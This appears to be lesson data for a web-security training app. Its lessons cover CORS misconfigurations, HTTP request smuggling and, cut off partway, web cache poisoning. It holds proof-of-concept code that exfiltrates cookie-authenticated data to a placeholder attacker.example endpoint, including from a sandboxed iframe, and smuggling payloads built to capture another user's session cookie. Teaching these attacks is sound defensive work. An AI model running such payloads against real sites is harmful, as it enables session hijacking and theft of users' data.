import type { Lesson } from "../types";

export const extraLessons: Lesson[] = [
  {
    id: "cors",
    title: "CORS Misconfigurations",
    summary: "Exploiting weak Cross-Origin Resource Sharing policies to steal sensitive user data.",
    cards: [
      {
        title: "Objective",
        kind: "objective",
        body: [
          "By the end of this lesson you can: explain what the Same-Origin Policy (SOP) and CORS normally do, recognise a reflected-Origin CORS misconfiguration and a trusted-null-origin misconfiguration, and build a proof-of-concept that steals authenticated data cross-origin.",
        ],
      },
      {
        title: "Normal operation: why the browser blocks cross-origin reads at all",
        kind: "intuition",
        body: [
          "By default, your browser's Same-Origin Policy stops a script loaded from one site (e.g. evil.example) from reading the response of a request made to another site (e.g. bank.example) \u2014 even though the request itself can usually be sent, the browser hides the response from the calling script.",
          "Analogy: you can shout a question over your neighbour's fence (send the request), but your neighbour's house has blackout curtains \u2014 you can't see the reply through the window (read the response) unless they explicitly open a curtain for you.",
          "CORS is the official mechanism for 'opening a curtain': a server can send headers like `Access-Control-Allow-Origin: https://partner.example` to say 'this specific other site is allowed to read my responses.' That's useful \u2014 e.g. a public weather API wants any website to embed its data.",
          "Where it breaks: some servers try to allow *many* trusted origins at once and take a shortcut \u2014 instead of checking a real allow-list, they just read whatever `Origin` header the browser sent and echo it straight back as the allowed origin. That 'curtain' now opens for literally anyone who asks.",
        ],
        tone: "info",
      },
      {
        title: "Prerequisites: Origin header, credentials, and preflight",
        kind: "prereq",
        body: [
          "`Origin` is a request header the browser adds automatically to cross-origin requests, containing the scheme+host+port of the page making the request (e.g. `Origin: https://attacker.example`). The browser sets it; client-side JavaScript cannot forge or remove it.",
          "`Access-Control-Allow-Origin` (ACAO) is the response header the server uses to say which origin(s) may read the response. It can be a literal origin, `*` (anyone), or \u2014 dangerously \u2014 a reflection of whatever `Origin` was sent.",
          "`Access-Control-Allow-Credentials: true` is a separate response header that additionally permits the browser to send cookies/session auth on the request AND let the calling script read the response. Critically, the CORS spec forbids combining `ACAO: *` with `Allow-Credentials: true` \u2014 so sites that want both credentials AND 'anyone' often resort to reflecting Origin instead, which is exactly the misconfiguration this lesson covers.",
          "The `null` origin is sent by the browser in specific edge cases: sandboxed iframes without `allow-same-origin`, locally opened `file://` pages, and some redirects. It is not tied to any specific attacker-controlled domain, which is precisely why trusting it is dangerous.",
        ],
      },
      {
        title: "The failure: reflecting Origin with credentials enabled",
        kind: "explain",
        body: [
          "A vulnerable server runs logic equivalent to: 'read the incoming `Origin` header, and set `Access-Control-Allow-Origin` to that exact same value' \u2014 instead of comparing it against a fixed allow-list of real partner domains.",
          "Mechanism: your browser sends `Origin: https://attacker.example` (because the script making the request was loaded from attacker.example). The server reflects it back verbatim, and if it also sets `Allow-Credentials: true`, the browser now believes: 'this origin is explicitly trusted by the server, including with cookies.' It lets the attacker's script read the response of a request made WITH the victim's session cookies attached.",
          "This differs from a normal cross-site request: without CORS headers, the browser would still let the request go out but would block the attacker's JavaScript from reading the reply. Reflection removes that block entirely, for every origin that ever asks.",
        ],
        code: `GET /api/user/profile HTTP/1.1
Host: api.target.example
Origin: https://attacker.example
Cookie: session=abc123victimcookie

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

{"email":"victim@example.com","apiKey":"sk_live_victimkey"}`,
        tone: "offense",
        check: {
          type: "mc",
          q: "A server sets `Access-Control-Allow-Origin` to whatever the `Origin` request header contained, and also sets `Access-Control-Allow-Credentials: true`. What does this let an attacker's website do?",
          options: [
            "Nothing new \u2014 Same-Origin Policy still blocks the response",
            "Read the response of authenticated (cookie-attached) requests made to the API, from any origin",
            "Forge the victim's Origin header to look like a trusted partner",
            "Disable TLS on the API so traffic is sent in plaintext",
          ],
          answer: 1,
          why: [
            "Reflecting Origin with credentials enabled is exactly how SOP's protection is bypassed \u2014 it is not still in effect.",
            "Correct \u2014 reflecting Origin plus allowing credentials tells the browser every origin is trusted with cookies attached, so any attacker site can read authenticated responses.",
            "The attacker never forges Origin; the browser sets it correctly to attacker.example, and the server trusts it anyway by reflecting it.",
            "TLS is unrelated; this is purely a browser-enforced response-reading policy being misconfigured.",
          ],
          explain:
            "Reflected-Origin-plus-credentials is the single most common real-world CORS bug: it converts 'any site can ask' into 'any site can read authenticated answers.'",
          hints: ["Think about what Allow-Credentials adds on top of just reflecting Origin.", "SOP normally blocks reading the response, not sending the request."],
          ref: "The failure: reflecting Origin with credentials enabled",
        },
      },
      {
        title: "Worked example: building the data-theft proof of concept",
        kind: "example",
        body: [
          "Scenario: api.target.example hosts `/api/user/profile`, which includes a personal API key in its JSON response. You've confirmed the server reflects Origin and sets `Allow-Credentials: true`.",
          "Step 1 \u2014 confirm with a manual request: using Burp Repeater, send a request to `/api/user/profile` with `Origin: https://totally-not-evil.example` and the victim's session cookie. The response includes `Access-Control-Allow-Origin: https://totally-not-evil.example` \u2014 proof the reflection is unconditional, not matched against any real allow-list.",
          "Step 2 \u2014 host a PoC page: write a page on a domain you control that performs `fetch()` with `credentials: 'include'` so the browser attaches the victim's cookies for target.example, not your own.",
          "Step 3 \u2014 exfiltrate: because the server trusts your origin, the browser lets your script read the JSON response; the script then sends that data to a server you control via a second request.",
          "Step 4 \u2014 deliver to the victim: get a logged-in victim to visit your page (e.g. via a link or stored XSS elsewhere). Visiting it alone \u2014 no click needed \u2014 triggers the theft, because the `fetch` runs automatically.",
          "WHY each step matters: step 1 is the proof the vulnerability is real and unconditional before investing in a PoC; steps 2\u20133 build and prove exploitation; step 4 shows the realistic delivery path \u2014 the victim only has to load a page while authenticated.",
        ],
        code: `<script>
fetch('https://api.target.example/api/user/profile', {
  credentials: 'include'
})
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.example/log?data=' + encodeURIComponent(JSON.stringify(data)));
  });
</script>`,
        tone: "offense",
        check: {
          type: "order",
          q: "Order the steps of the CORS data-theft proof of concept.",
          items: [
            "Manually confirm the server reflects an arbitrary Origin value with Allow-Credentials: true",
            "Host a page on an attacker-controlled domain with a fetch(..., {credentials:'include'})",
            "Browser attaches the victim's session cookie and the server's reflected CORS headers let the script read the JSON response",
            "Script exfiltrates the stolen response to an attacker-controlled logging endpoint",
          ],
          explain:
            "You always confirm the raw behaviour with a manual request before building the browser-based exploit, so you know the PoC will actually work.",
          hints: ["Which step needs no browser at all, just Repeater?", "credentials:'include' is what makes fetch send cookies cross-origin."],
          ref: "Worked example: building the data-theft proof of concept",
        },
      },
      {
        title: "A second failure: trusting the null origin",
        kind: "explain",
        body: [
          "Some developers, aware that reflecting arbitrary Origins is risky, instead hardcode a check like 'allow this origin if it's in my partner list, OR if it's null' \u2014 reasoning that `null` only shows up in 'safe' contexts like local files.",
          "That reasoning is wrong: an attacker can deliberately produce a `null` Origin from a page they fully control, simply by loading their exploit inside a sandboxed iframe (`<iframe sandbox=\"allow-scripts allow-forms\" srcdoc=\"...\">`) without the `allow-same-origin` flag. The browser then sends `Origin: null` on requests from inside that iframe, even though the iframe's parent page is attacker.example, not some innocuous local file.",
          "If the server reflects or hardcodes trust for `null` and also sets `Allow-Credentials: true`, the same cookie-theft technique from the worked example works, just launched from inside a sandboxed iframe instead of a plain script.",
        ],
        code: `<!-- attacker.example hosts this page -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('https://api.target.example/api/user/profile', {credentials:'include'})
      .then(r => r.text())
      .then(d => fetch('https://attacker.example/log?d=' + btoa(d)));
  </script>
"></iframe>`,
        tone: "offense",
      },
      {
        title: "Common mistakes",
        kind: "mistakes",
        body: [
          "Mistake: assuming `ACAO: *` is automatically dangerous. A wildcard origin is actually SAFER than reflection in one respect \u2014 browsers refuse to combine `*` with `Allow-Credentials: true`, so a pure-wildcard API (no credentials) cannot have cookies attached and generally only exposes data that was already meant to be public.",
          "Mistake: treating any `Access-Control-Allow-Origin` header you see as proof of a vulnerability. You must check it is either a literal reflection of an arbitrary Origin you supplied, or an overly broad/incorrectly matched allow-list (e.g. a regex that matches `evil-target.example` because it only checks 'contains target.example') \u2014 AND that `Allow-Credentials: true` is also present, since without credentials the stolen data is typically not sensitive.",
          "Mistake: confusing CORS misconfiguration with CSRF. CORS issues let an attacker's JavaScript *read* the response of a cross-origin request; CSRF lets an attacker *trigger* a state-changing request without needing to read anything back. A site can be vulnerable to one, both, or neither \u2014 they require separate testing.",
        ],
      },
      {
        title: "Guided practice",
        kind: "practice",
        body: [
          "An API at reports.example returns: `Access-Control-Allow-Origin: https://staging.reports.example.attacker.example` after you sent `Origin: https://staging.reports.example.attacker.example`, and also sets `Access-Control-Allow-Credentials: true`. The developer intended to allow only subdomains of reports.example using a check like 'does the Origin end in reports.example'. What is the actual mistake in that check, and does this configuration qualify as exploitable?",
        ],
        check: {
          type: "mc",
          q: "The developer's check was 'does the Origin string CONTAIN reports.example'. Why does this allow `https://staging.reports.example.attacker.example`?",
          options: [
            "It doesn't allow it \u2014 that domain is unrelated to reports.example",
            "Because `reports.example` appears as a substring of the attacker's own domain name, satisfying a naive 'contains' check even though the attacker fully owns and controls that domain",
            "Because attacker.example is on the official allow-list",
            "Because the request used HTTPS",
          ],
          answer: 1,
          why: [
            "It does allow it, which is exactly the bug \u2014 the attacker registered a domain engineered to contain the trusted string.",
            "Correct \u2014 'contains' and even some naive 'ends with' checks can be defeated by an attacker who controls a domain they chose specifically to include the trusted substring.",
            "There is no real allow-list here, just a flawed string check being bypassed.",
            "The scheme (HTTP vs HTTPS) is irrelevant to this specific bug.",
          ],
          explain:
            "Origin validation must be an exact match against a known-good list of full origins, never a substring/contains/startswith/endswith check, because attackers can register domains engineered to pass those weaker checks.",
          hints: ["Who registered staging.reports.example.attacker.example, and what domain do they actually control?", "A 'contains' check cares only whether the substring appears anywhere."],
          ref: "Guided practice",
        },
      },
      {
        title: "Practical relevance: what a CORS PoC proves and does not prove",
        kind: "relevance",
        body: [
          "Demonstrating that your PoC page (hosted on a domain you control, or a documentation-style placeholder like attacker.example in a report) can read an authenticated victim's data proves the misconfiguration is real and exploitable, not just theoretical.",
          "It does NOT prove the impact of every endpoint on the API \u2014 you must test specifically which endpoints leak sensitive data versus already-public data, and report severity accordingly (an endpoint that only returns a user's display name is lower severity than one leaking API keys or payment details).",
          "Stay within your authorised scope: only build and host PoCs against the target you've been engaged to test, using a domain/account you control, and never deliver the PoC link to real third-party users without explicit authorisation for that kind of social-engineering test.",
        ],
      },
    ],
    exercises: [
      {
        type: "mc",
        q: "Why is reflecting the Origin header back in Access-Control-Allow-Origin dangerous specifically when Access-Control-Allow-Credentials is also true?",
        options: [
          "It disables HTTPS for the connection",
          "It tells the browser that every origin is trusted to read authenticated (cookie-attached) responses",
          "It prevents the browser from sending cookies at all",
          "It makes the site vulnerable to SQL injection",
        ],
        answer: 1,
        why: [
          "TLS/HTTPS is a separate transport-layer concern, unrelated to the CORS response headers.",
          "Correct \u2014 reflection means the check always passes, and Allow-Credentials means the passing check also grants cookie-based authenticated access.",
          "Allow-Credentials:true does the opposite \u2014 it permits cookies to be sent and the response read.",
          "CORS headers have nothing to do with how the database processes queries.",
        ],
        explain:
          "Reflection alone just means 'any site may read this (non-credentialed) response'. Adding Allow-Credentials upgrades that to 'any site may read this authenticated response', which is the dangerous combination.",
        hints: [
          "Think about what Same-Origin Policy blocks by default: sending the request, or reading the response?",
          "Allow-Credentials is what lets cookies ride along AND the response be read.",
        ],
        ref: "The failure: reflecting Origin with credentials enabled",
      },
      {
        type: "mc",
        q: "A sandboxed iframe (without allow-same-origin) makes a fetch request. What Origin header value does the browser send?",
        options: [
          "The parent page's real origin (e.g. https://attacker.example)",
          "null",
          "No Origin header is sent at all",
          "The target server's own origin",
        ],
        answer: 1,
        why: [
          "A sandboxed iframe without allow-same-origin deliberately loses its normal origin identity; it does not fall back to the parent's origin.",
          "Correct \u2014 this is exactly the mechanism attackers use to generate a null Origin from a page they fully control.",
          "The browser still attaches an Origin header on cross-origin requests; it's just the special null value here.",
          "The Origin header always reflects the requester's context, never the destination server's.",
        ],
        explain:
          "This is why servers that specifically trust the null origin are vulnerable: attackers can manufacture null at will using a sandboxed iframe, it's not a signal of trustworthiness.",
        hints: ["What does the sandbox attribute strip away from the iframe's identity?", "Recall the second failure card about trusting null."],
        ref: "A second failure: trusting the null origin",
      },
      {
        type: "order",
        q: "Order the steps an attacker takes to exploit a reflected-Origin CORS misconfiguration with credentials enabled.",
        items: [
          "Confirm the endpoint reflects an arbitrary Origin and sets Allow-Credentials: true",
          "Host a malicious script on an attacker-controlled domain",
          "Victim visits the attacker's page while logged into the target site",
          "The victim's browser attaches session cookies and lets the script read the cross-origin response",
          "The script exfiltrates the stolen data to an attacker-controlled endpoint",
        ],
        explain: "The attack requires the victim to be authenticated and to load the attacker's page, which silently triggers the cross-origin read and exfiltration.",
        hints: [
          "First, confirm the bug exists before building anything.",
          "Then, build and host the delivery page.",
          "The victim must load the page for the exploit to fire.",
        ],
        ref: "Worked example: building the data-theft proof of concept",
      },
      {
        type: "fill",
        q: "Fill in the blank: a wildcard ACAO value of '____' can never legally be combined with Access-Control-Allow-Credentials: true, per the CORS specification \u2014 which is why some developers resort to reflecting Origin instead.",
        answers: ["*"],
        explain:
          "Browsers reject the combination of a wildcard ACAO with Allow-Credentials: true. Developers who want 'allow many origins' plus credentials sometimes work around this by reflecting the Origin header verbatim, which reintroduces the vulnerability this lesson covers.",
        hints: ["It's a single character.", "Think 'match anything' in most pattern languages."],
        ref: "Prerequisites: Origin header, credentials, and preflight",
      },
      {
        type: "match",
        q: "Match the CORS header or value to its role.",
        pairs: [
          ["Origin", "Browser-set request header identifying the requesting page's scheme+host+port"],
          ["Access-Control-Allow-Origin", "Response header stating which origin(s) may read the response"],
          ["Access-Control-Allow-Credentials", "Response header permitting cookies to be sent and the credentialed response to be read"],
          ["null origin", "Sent by sandboxed iframes and some local contexts; attacker-manufacturable"],
        ],
        explain: "These headers and values work together to define the cross-origin reading boundary; reflecting Origin or trusting null breaks that boundary.",
        hints: ["Origin is the only one of these sent by the browser on the request.", "Allow-Credentials is about cookies, not the origin match itself."],
        ref: "Prerequisites: Origin header, credentials, and preflight",
      },
    ],
  },
  {
    id: "smuggling",
    title: "HTTP Request Smuggling",
    summary: "Desynchronizing front-end and back-end servers to 'smuggle' hidden requests.",
    cards: [
      {
        title: "Objective",
        kind: "objective",
        body: [
          "By the end of this lesson you can: explain how a front-end proxy and back-end server normally agree on request boundaries, describe how CL.TE and TE.CL desync attacks break that agreement, and trace how a smuggled prefix ends up prepended to another user's request.",
        ],
      },
      {
        title: "Normal operation: one TCP connection, many requests, clean boundaries",
        kind: "intuition",
        body: [
          "Most production web architectures put a front-end component (a load balancer, reverse proxy, or CDN) in front of a back-end application server. To be efficient, the front-end often reuses the same persistent TCP connection to the back-end for many different users' requests, one after another, rather than opening a new connection every time.",
          "Analogy: imagine a single phone line used to relay many separate customers' orders to a warehouse, one after another. As long as everyone agrees exactly where one order's text ends and the next one's begins, the warehouse correctly fulfils each order for the right customer.",
          "For that to work, both ends MUST agree, for every single request, on exactly how many bytes make up that request's body \u2014 so the back-end knows precisely where request A ends and request B (the next customer's order) begins.",
          "Where it breaks: HTTP gives two different ways to say 'how long is this body' \u2014 `Content-Length` (a byte count) and `Transfer-Encoding: chunked` (self-describing chunks ending in a zero-length chunk). If the front-end and back-end pick different ones, or interpret an ambiguous request differently, they disagree about where the order ends \u2014 and the warehouse starts fulfilling an order built partly from the next customer's words.",
        ],
        tone: "info",
      },
      {
        title: "Prerequisites: Content-Length and Transfer-Encoding",
        kind: "prereq",
        body: [
          "`Content-Length: N` tells the receiver 'the body is exactly N bytes long; after N bytes, this request is over, and any new bytes on the connection start a new request.'",
          "`Transfer-Encoding: chunked` tells the receiver 'the body is split into chunks; read a hex size line, then that many bytes of data, repeat, until you see a chunk declared as size `0`, which marks the end of the body.'",
          "A single request is not supposed to specify both, but many real servers accept requests that include both headers anyway, and simply pick one to honour \u2014 which one they pick is an implementation detail that differs between software, and that's the core of this lesson's vulnerability.",
        ],
      },
      {
        title: "The failure: front-end and back-end disagree on where the request ends",
        kind: "explain",
        body: [
          "HTTP Request Smuggling occurs when a request contains BOTH Content-Length and Transfer-Encoding headers, and the front-end proxy uses one of them to decide where the request ends while the back-end server uses the other \u2014 so they disagree about how many bytes belong to this request.",
          "CL.TE: the front-end trusts Content-Length and forwards the whole request body as one unit. The back-end trusts Transfer-Encoding instead, so it stops reading as soon as it sees the terminating zero-length chunk \u2014 anything the front-end sent AFTER that point (but still inside what the front-end thought was one request's Content-Length) is left sitting in the back-end's buffer, unprocessed.",
          "TE.CL: the reverse. The front-end trusts Transfer-Encoding and forwards the whole chunked message. The back-end trusts Content-Length instead and stops reading after exactly N bytes, which can be shorter than the full chunked body \u2014 leaving a leftover chunk of attacker-controlled data sitting in the buffer.",
          "In both cases, whatever bytes are left unprocessed in the back-end's buffer do NOT disappear. The back-end treats them as the BEGINNING of the next request it reads off that same persistent connection \u2014 and the next request to arrive on that connection usually belongs to a completely different, unsuspecting user.",
        ],
        code: `POST / HTTP/1.1
Host: target.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`,
        tone: "offense",
        check: {
          type: "mc",
          q: "In a CL.TE vulnerable pair of servers, which header does the BACK-END server use to decide where the request body ends?",
          options: ["Content-Length", "Transfer-Encoding", "Host", "X-Forwarded-For"],
          answer: 1,
          why: [
            "Content-Length is what the FRONT-end uses in a CL.TE attack \u2014 that's the first letter of the acronym.",
            "Correct \u2014 CL.TE names the front-end's choice first, then the back-end's: the back-end here trusts Transfer-Encoding.",
            "Host identifies the virtual server to route to; it plays no role in body-length disagreement.",
            "X-Forwarded-For communicates client IP information; it is unrelated to body framing.",
          ],
          explain:
            "The acronym CL.TE is read as [what the Front-end trusts].[what the Back-end trusts]. Since the back-end trusts Transfer-Encoding, it stops at the chunk terminator while the front-end already forwarded more bytes based on Content-Length.",
          hints: ["Read the acronym as two positions: Front-end first, Back-end second.", "TE.CL is the mirror image \u2014 which one is listed second here?"],
          ref: "The failure: front-end and back-end disagree on where the request ends",
        },
      },
      {
        title: "Worked example: smuggling a request to hijack the next user's session",
        kind: "example",
        body: [
          "Scenario: you suspect login.example runs a CL.TE-vulnerable front-end/back-end pair. You want to prove impact by hijacking a victim's session, not just desyncing the connection.",
          "Step 1 \u2014 confirm the desync: send a request with both headers where Content-Length (13) is deliberately shorter than what Transfer-Encoding implies, including the literal string `SMUGGLED` after the terminating chunk. If the NEXT, unrelated request you send on the same connection comes back with an unexpected 404 or error referencing 'SMUGGLEDGET /...', that confirms your extra bytes got prepended to it \u2014 proof of the desync.",
          "Step 2 \u2014 craft a credential-capturing smuggled request: instead of a throwaway string, smuggle a request designed to make the NEXT real user's request get appended as data somewhere you can read it, such as a request to `/comment` whose body field captures whatever text follows it.",
          "Step 3 \u2014 wait for a victim: because the smuggled bytes sit in the back-end's buffer, the very next real user's request on that reused connection gets its leading bytes merged into your planted request. If your planted request was a comment-post, the victim's own request line and headers (potentially including their session cookie) become the comment's text.",
          "Step 4 \u2014 read the result: you retrieve the posted comment (or whatever sink you targeted) and read out the victim's leaked cookie value, which you can then use to hijack their session.",
          "WHY each step matters: step 1 proves the desync is real with a cheap, harmless payload before attempting anything sensitive; steps 2\u20134 escalate from 'bytes get mixed up' to 'I obtained another user's live session', which is the difference between a theoretical finding and a demonstrated, reportable impact.",
        ],
        code: `POST /comment HTTP/1.1
Host: login.example
Content-Length: 150
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: login.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=`,
        tone: "offense",
        check: {
          type: "order",
          q: "Order the steps of the session-hijacking smuggling attack from this worked example.",
          items: [
            "Send a CL.TE payload with a harmless marker string to confirm the desync exists",
            "Craft a smuggled request targeting a sink that will capture trailing attacker-chosen text (e.g. a comment field)",
            "Wait for the next real user's request to be appended to the smuggled request on the reused connection",
            "Retrieve the sink's stored content to read the victim's leaked request data (e.g. session cookie)",
          ],
          explain:
            "Confirmation first (cheap, low-risk), then escalate to a request that actually captures another user's data, then wait for and harvest the result.",
          hints: ["Never build the sensitive payload before proving the desync is real.", "The sink needs to store attacker-visible text that follows it."],
          ref: "Worked example: smuggling a request to hijack the next user's session",
        },
      },
      {
        title: "A third variant and real-world impact: TE.TE and queue poisoning",
        kind: "explain",
        body: [
          "TE.TE (also called TE obfuscation): both the front-end and back-end nominally support Transfer-Encoding, so a simple CL/TE mismatch wouldn't work \u2014 instead, the attacker sends a Transfer-Encoding header that's subtly malformed (extra spaces, a weird capitalisation like `Transfer-Encoding: xchunked`, or a duplicate header) so that ONE of the two servers fails to recognise it as chunked and silently falls back to Content-Length, recreating a CL.TE or TE.CL mismatch indirectly.",
          "Beyond session hijacking, smuggling is also used for 'request queue poisoning' more broadly: redirecting a victim's request to an attacker-chosen response, bypassing front-end security controls (e.g. a WAF or auth check that only inspects the OUTER request the front-end sees, never the smuggled inner one), or even smuggling a request to an internal-only admin endpoint that the front-end would normally block from external users.",
          "Because the technique relies on the back-end implicitly trusting whatever the front-end forwards as 'one request', it is fundamentally a trust-boundary bug between two different pieces of software disagreeing about the same bytes \u2014 the same theme as SSRF trusting a server-side fetch, but here the disagreement is about parsing, not destination.",
        ],
        tone: "offense",
      },
      {
        title: "Common mistakes",
        kind: "mistakes",
        body: [
          "Mistake: assuming smuggling requires sending many requests quickly. A single carefully-crafted request is enough to desync a connection \u2014 the vulnerability is about one ambiguous request, not request volume or rate.",
          "Mistake: testing smuggling payloads directly against production without realising they can poison the connection for a real victim. A confirmation payload should use an inert marker (like a harmless string or a request to a 404 path) rather than anything that could capture or corrupt a genuine user's data, unless you are explicitly authorised and have coordinated the timing/scope of such tests.",
          "Mistake: confusing request smuggling with request splitting (header/CRLF injection into a single request to add extra unintended headers). Smuggling specifically exploits a LENGTH-FRAMING disagreement between two separate servers over a shared connection; it is not about injecting a header into your own single request.",
        ],
      },
      {
        title: "Guided practice",
        kind: "practice",
        body: [
          "You send a request to orders.example with both `Content-Length: 4` and `Transfer-Encoding: chunked`, where the chunked body is actually much longer than 4 bytes and contains a trailing attacker string after the zero-chunk. The front-end forwards the entire body based on the long chunked length; the back-end stops reading after exactly 4 bytes. Which variant is this (CL.TE or TE.CL), and where do the leftover bytes end up?",
        ],
        check: {
          type: "fill",
          q: "This scenario (front-end trusts Transfer-Encoding, back-end trusts Content-Length and stops early) is the ____.____ variant.",
          answers: ["TE.CL", "TE CL", "TECL"],
          explain:
            "TE.CL: Front-end uses Transfer-Encoding (forwards the full chunked body), Back-end uses Content-Length (stops reading after N bytes) \u2014 leaving the remainder of the chunked body as leftover bytes that get treated as the start of the next request on that connection.",
          hints: ["Read the acronym as Front-end choice, then Back-end choice.", "Here the front-end followed the chunked encoding, not the length."],
          ref: "The failure: front-end and back-end disagree on where the request ends",
        },
      },
      {
        title: "Practical relevance: what a confirmed desync proves and does not prove",
        kind: "relevance",
        body: [
          "A confirmed desync (e.g. a harmless marker string appearing in an unrelated later response) proves the front-end/back-end pair disagrees on request framing \u2014 a real, exploitable architectural flaw, not a one-off fluke.",
          "It does NOT by itself prove you can hijack a specific victim's session or bypass a specific security control \u2014 each of those requires a separate, deliberately-crafted smuggled payload and, in many cases, careful timing to land on a real victim's request rather than your own follow-up test request.",
          "Because smuggling payloads can genuinely corrupt or hijack a real user's in-flight request, only test this on systems in your authorised scope, prefer isolated/staging environments when available, and use inert confirmation payloads before attempting anything that could affect a live third party's session.",
        ],
      },
    ],
    exercises: [
      {
        type: "mc",
        q: "In a CL.TE attack, which header does the back-end server prioritize?",
        options: ["Content-Length", "Transfer-Encoding", "Host", "X-Forwarded-For"],
        answer: 1,
        why: [
          "Content-Length is the front-end's choice in CL.TE, not the back-end's.",
          "Correct \u2014 CL.TE means the Front-end uses Content-Length and the Back-end uses Transfer-Encoding.",
          "Host is used for virtual-host routing, unrelated to body framing disagreements.",
          "X-Forwarded-For communicates client IP, unrelated to this vulnerability.",
        ],
        explain: "CL.TE means the Front-end uses Content-Length and the Back-end uses Transfer-Encoding, creating the length mismatch.",
        hints: [
          "The acronym stands for [Front-end].[Back-end].",
          "The second part 'TE' refers to the Back-end.",
        ],
        ref: "The failure: front-end and back-end disagree on where the request ends",
      },
      {
        type: "fill",
        q: "In a chunked message, the end of the body is indicated by a chunk of size ____.",
        answers: ["0"],
        explain: "In Transfer-Encoding: chunked, a chunk declared with size 0 indicates the end of the transfer, after which no more chunk data follows.",
        hints: [
          "It's a single digit.",
          "It represents zero remaining data.",
        ],
        ref: "Prerequisites: Content-Length and Transfer-Encoding",
      },
      {
        type: "mc",
        q: "Why is TE.TE (obfuscated Transfer-Encoding) needed as a separate variant from plain CL.TE/TE.CL?",
        options: [
          "It isn't needed \u2014 it's identical to CL.TE",
          "Because when both servers nominally support chunked encoding, the attacker must trick ONE of them into silently falling back to Content-Length by malforming the header",
          "Because TE.TE only works over HTTPS",
          "Because TE.TE requires no Content-Length header at all",
        ],
        answer: 1,
        why: [
          "It's a distinct technique precisely because plain CL.TE/TE.CL mismatches don't apply when both servers claim to support chunked.",
          "Correct \u2014 a malformed or duplicated Transfer-Encoding header can make one server (but not the other) fall back to trusting Content-Length instead, recreating the mismatch indirectly.",
          "TLS/HTTPS has no bearing on which header framing a server trusts.",
          "TE.TE payloads still typically include a Content-Length header; the trick is making one server ignore the Transfer-Encoding header instead.",
        ],
        explain:
          "TE.TE exists for servers that both nominally handle chunked encoding; the attacker must find an obfuscation that only one of the two implementations rejects/ignores, causing an effective CL/TE disagreement.",
        hints: ["What if both servers claim to support chunked \u2014 does a basic CL/TE mismatch still apply?", "Obfuscation targets how strictly each server parses the header name/value."],
        ref: "A third variant and real-world impact: TE.TE and queue poisoning",
      },
      {
        type: "match",
        q: "Match the smuggling technique to its description.",
        pairs: [
          ["CL.TE", "Front-end uses Content-Length, Back-end uses Transfer-Encoding"],
          ["TE.CL", "Front-end uses Transfer-Encoding, Back-end uses Content-Length"],
          ["TE.TE", "Both nominally support TE, but obfuscation makes one fall back to CL"],
          ["Queue poisoning", "The smuggled bytes become the start of the next user's request on the reused connection"],
        ],
        explain: "These variations depend on which server supports which header, how they handle conflicting or obfuscated headers, and what happens to the leftover bytes.",
        hints: [
          "CL stands for Content-Length.",
          "TE stands for Transfer-Encoding.",
          "Queue poisoning describes the consequence, not the detection technique.",
        ],
        ref: "The failure: front-end and back-end disagree on where the request ends",
      },
      {
        type: "order",
        q: "Order the steps to confirm and demonstrate impact of a CL.TE smuggling vulnerability safely.",
        items: [
          "Send a CL.TE payload containing a harmless marker string after the terminating chunk",
          "Send a harmless follow-up request on the same connection and check if the marker appears mixed into its response",
          "If confirmed, craft a smuggled request targeting a data-capturing sink instead of a harmless marker",
          "Harvest the sink to recover data from the next real request that got appended",
        ],
        explain:
          "Always confirm with a low-risk marker before attempting anything that could capture real user data, matching the lesson's emphasis on inert confirmation first.",
        hints: ["What's the cheapest, safest way to prove the desync exists?", "Only escalate to a data-capturing payload after confirmation."],
        ref: "Worked example: smuggling a request to hijack the next user's session",
      },
    ],
  },
  {
    id: "cache-poison",
    title: "Web Cache Poisoning",
    summary: "Manipulating caches to serve malicious content to other users.",
    cards: [
      {
        title: "Objective",
        kind: "objective",
        body: [
          "By the end of this lesson you can: explain how web caches normally decide whether to serve a stored response, identify unkeyed inputs that let an attacker poison a cached page for everyone, and distinguish cache poisoning from web cache deception.",
        ],
      },
      {
        title: "Normal operation: why caches exist and how they decide what to serve",
        kind: "intuition",
        body: [
          "Generating a dynamic page (querying a database, rendering templates) costs server time. A cache sits in front of the application and stores a copy of a response so that the NEXT identical request can be served instantly from storage, without bothering the real application server.",
          "Analogy: a librarian keeps photocopies of frequently requested documents at the front desk. If you ask for a document she's already photocopied, she hands you the copy instead of walking to the archive. But she needs a reliable way to know 'is this new request actually asking for the SAME document as the one I already copied?'",
          "To decide that, the cache builds a 'cache key' from parts of the request it considers meaningful \u2014 normally just the URL path and the Host header. If two requests produce the same cache key, the cache assumes they deserve the identical response and serves the stored copy to the second (and third, fourth...) requester, whoever they are.",
          "Where it breaks: the application generating the ORIGINAL page sometimes reads MORE of the request than just the URL and Host \u2014 for example, a header like `X-Forwarded-Host`. The cache has no idea the app did that, because the cache never looks at that header when building its key. So the cache will happily serve a response that was secretly customised by a header it never checked, to every single visitor who asks for that same cached URL.",
        ],
        tone: "info",
      },
      {
        title: "Prerequisites: cache keys and unkeyed inputs",
        kind: "prereq",
        body: [
          "Cache key: the subset of a request (typically method + URL path + Host header, sometimes also query string or specific cookies) that the cache uses to look up and compare requests. Two requests with the same cache key are treated as interchangeable by the cache.",
          "Unkeyed input: any part of the request that the ORIGIN SERVER reads and uses when generating the page, but that the CACHE ignores when building its key. Common unkeyed inputs include `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, and sometimes specific query parameters the cache was configured to strip before hashing.",
          "The mismatch between 'what the cache keys on' and 'what the app actually uses to render the page' is the root cause of every attack in this lesson: the cache can be tricked into storing a response that was customised by something it never accounted for.",
        ],
      },
      {
        title: "The failure: poisoning via an unkeyed header",
        kind: "explain",
        body: [
          "Mechanism: the attacker sends ONE request to a cacheable URL (e.g. the homepage) with an unusual value in an unkeyed header, such as `X-Forwarded-Host: attacker.example`. If the application uses that header (perhaps to build an absolute URL for a resource it embeds in the page, like a script tag), the generated HTML now contains `<script src=\"https://attacker.example/script.js\">`.",
          "The cache computes its key from only the URL and Host \u2014 which look completely normal \u2014 and stores this poisoned HTML as THE cached response for that URL, with no awareness that the content was customised by a header it ignored.",
